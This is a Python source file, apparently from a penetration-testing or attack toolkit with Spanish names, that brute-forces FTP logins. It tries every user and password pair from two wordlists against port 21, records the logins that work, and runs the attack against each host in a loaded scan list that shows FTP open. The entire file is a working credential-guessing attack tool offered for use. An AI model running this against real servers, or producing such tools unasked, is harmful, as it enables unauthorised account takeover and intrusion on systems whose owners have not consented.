import os
import json
import ftplib

FTP_RESULTS_DIR = "results/ftp"
WORDLIST_USER = "wordlists/users.txt"
WORDLIST_PASS = "wordlists/passwords.txt"

def fuerza_bruta_ftp(ip, port=21):
    os.makedirs(FTP_RESULTS_DIR, exist_ok=True)
    resultados = {
        "host": ip,
        "port": port,
        "valid_credentials": []
    }

    with open(WORDLIST_USER, "r") as f:
        usuarios = [line.strip() for line in f if line.strip()]

    with open(WORDLIST_PASS, "r") as f:
        contrasenas = [line.strip() for line in f if line.strip()]

    print(f"[*] Iniciando fuerza bruta FTP contra {ip}:{port}...")

    for usuario in usuarios:
        for contrasena in contrasenas:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port, timeout=5)
                ftp.login(usuario, contrasena)
                print(f"[+] Credenciales válidas encontradas: {usuario}:{contrasena}")
                resultados["valid_credentials"].append({"usuario": usuario, "password": contrasena})
                ftp.quit()
            except ftplib.error_perm:
                continue
            except Exception:
                continue

    ruta_salida = os.path.join(FTP_RESULTS_DIR, f"ftp_{ip}_bruteforce.json")
    with open(ruta_salida, "w") as f:
        json.dump(resultados, f, indent=4)

    print(f"[+] Resultados guardados en {ruta_salida}")
    return resultados

def run_ftp_attack():
    from utils.common import cargar_hosts
    hosts = cargar_hosts()
    for host in hosts:
        ip = host.get("ip")
        for port_info in host.get("open_ports", []):
            if port_info.get("port") == 21:
                fuerza_bruta_ftp(ip)
                break
